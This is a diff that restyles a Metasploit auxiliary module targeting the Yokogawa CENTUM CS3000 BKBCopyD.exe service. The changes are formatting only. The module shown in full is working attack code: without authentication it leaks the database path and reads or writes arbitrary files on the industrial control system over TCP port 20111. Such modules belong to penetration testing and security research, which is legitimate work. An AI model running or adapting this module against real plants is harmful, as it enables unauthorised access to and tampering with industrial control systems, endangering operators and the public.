@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,45 +7,43 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Yokogawa BKBCopyD.exe Client',
-      'Description'    => %q{
-        This module allows an unauthenticated user to interact with the Yokogawa
-        CENTUM CS3000 BKBCopyD.exe service through the PMODE, RETR and STOR
-        operations.
-      },
-      'Author'         =>
-        [ 'Unknown' ],
-      'References'     =>
-        [
-          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2014/08/09/r7-2014-10-disclosure-yokogawa-centum-cs3000-bkbcopydexe-file-system-access']
-        ],
-      'Actions'     =>
-        [
-          ['PMODE', { 'Description' => 'Leak the current database' }],
-          ['RETR',  { 'Description' => 'Retrieve remote file' }],
-          ['STOR',  { 'Description' => 'Store remote file' }]
-        ],
-      'DisclosureDate' => 'Aug 9 2014',
-      'DefaultTarget'  => 0))
+                      'Name'           => 'Yokogawa BKBCopyD.exe Client',
+                      'Description'    => %q(
+                        This module allows an unauthenticated user to interact with the Yokogawa
+                        CENTUM CS3000 BKBCopyD.exe service through the PMODE, RETR and STOR
+                        operations.
+                      ),
+                      'Author'         =>
+                        [ 'Unknown' ],
+                      'References'     =>
+                        [
+                          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2014/08/09/r7-2014-10-disclosure-yokogawa-centum-cs3000-bkbcopydexe-file-system-access']
+                        ],
+                      'Actions' =>
+                        [
+                          ['PMODE', { 'Description' => 'Leak the current database' }],
+                          ['RETR',  { 'Description' => 'Retrieve remote file' }],
+                          ['STOR',  { 'Description' => 'Store remote file' }]
+                        ],
+                      'DisclosureDate' => 'Aug 9 2014',
+                      'DefaultTarget'  => 0))
 
     register_options(
       [
         Opt::RPORT(20111),
         OptString.new('RPATH', [ false, 'The Remote Path (required to RETR and STOR)', "" ]),
         OptPath.new('LPATH', [ false, 'The Local Path (required to STOR)' ])
-      ], self.class)
+      ], self.class
+    )
   end
 
-  def srvport
-    @srvport
-  end
+  attr_reader :srvport
 
   def run
     exploit
@@ -52,7 +51,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def exploit
     @srvport = rand(1024..65535)
-    print_status("#{@srvport}")
+    print_status(@srvport.to_s)
     # We make the client connection before giving control to the TCP Server
     # in order to release the src port, so the server can start correctly
 
@@ -61,7 +60,7 @@ class MetasploitModule < Msf::Auxiliary
       print_status("Sending PMODE packet...")
       data = "PMODE MR_DBPATH\n"
       res = send_pkt(data)
-      if res and res =~ /^210/
+      if res && res =~ /^210/
         print_good("Success: #{res}")
       else
         print_error("Failed...")
@@ -71,12 +70,12 @@ class MetasploitModule < Msf::Auxiliary
       data = "RETR #{datastore['RPATH']}\n"
       print_status("Sending RETR packet...")
       res = send_pkt(data)
-      return unless res and res =~ /^150/
+      return unless res && res =~ /^150/
     when 'STOR'
       data = "STOR #{datastore['RPATH']}\n"
       print_status("Sending STOR packet...")
       res = send_pkt(data)
-      return unless res and res =~ /^150/
+      return unless res && res =~ /^150/
     else
       print_error("Incorrect action")
       return
@@ -86,18 +85,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def send_pkt(data)
-    connect(true, {'CPORT' => @srvport})
+    connect(true, 'CPORT' => @srvport)
     sock.put(data)
     data = sock.get_once
     disconnect
 
-    return data
+    data
   end
 
   def valid_response?(data)
     return false unless !!data
     return false unless data =~ /500  'yyparse error': command not understood/
-    return true
+    true
   end
 
   def on_client_connect(c)
@@ -106,8 +105,8 @@ class MetasploitModule < Msf::Auxiliary
       File.new(datastore['LPATH'], "rb") { |f| contents = f.read }
       print_status("#{c.peerhost} - Sending data...")
       c.put(contents)
-      self.service.close
-      self.service.stop
+      service.close
+      service.stop
     end
   end
 
@@ -124,9 +123,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def on_client_close(c)
+  def on_client_close(_c)
     stop_service
   end
-
 end
-
